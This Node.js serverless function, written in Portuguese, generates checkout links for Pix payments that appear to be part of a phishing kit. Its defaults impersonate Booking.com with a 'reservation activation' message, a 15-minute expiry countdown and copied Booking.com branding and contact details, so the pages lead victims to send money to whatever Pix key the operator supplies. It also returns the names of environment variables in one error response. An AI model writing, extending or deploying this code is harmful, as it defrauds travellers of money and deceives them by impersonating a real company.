const crypto = require('crypto');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { return res.status(200).end(); }
  if (req.method !== 'POST') { return res.status(405).json({ error: 'Metodo nao permitido' }); }

  try {
    const dados = req.body;
    if (!dados || !dados.chave) {
      return res.status(400).json({ error: 'Chave pix obrigatoria' });
    }

    const id = crypto.randomBytes(6).toString('hex');

    const payload = JSON.stringify({
      chave:  dados.chave,
      marca:  dados.marca  || 'Nome do hospede',
      desc:   dados.desc   || 'Nome da casa',
      valor:  dados.valor  || 0,
      frase:  dados.frase  || 'Voce esta ativando sua reserva na Booking',
      sub:    dados.sub    || 'Efetivacao de Reserva',
      lTimer: dados.lTimer || 'Reserva expira em:',
      mins:   dados.mins   || 15,
      logo:   dados.logo   || '',
      rodape: {
        nome:   'Booking.com',
        slogan: 'Sua seguranca e o nosso compromisso',
        tel:    '(11) 4700-3708',
        sac:    '0800-047-4429',
        email:  'suporte@booking.com',
        copy:   '2026 Booking.com. Todos os direitos reservados.'
      }
    });

    const UPSTASH_URL   = process.env.KV_REST_API_URL;
    const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;

    if (!UPSTASH_URL || !UPSTASH_TOKEN) {
      return res.status(500).json({ error: 'Variaveis de ambiente nao configuradas', vars: Object.keys(process.env).filter(k => k.startsWith('KV')) });
    }

    const upstashRes = await fetch(`${UPSTASH_URL}/set/co:${id}`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${UPSTASH_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify([payload, 'EX', '604800'])
    });

    const upstashJson = await upstashRes.json();

    if (upstashJson.error) {
      return res.status(500).json({ error: 'Upstash erro: ' + upstashJson.error });
    }

    const host = req.headers.host || 'geradordecheckoutpix.vercel.app';
    const link = `https://${host}/checkout.html?id=${id}`;

    return res.status(200).json({ link, id });

  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
};
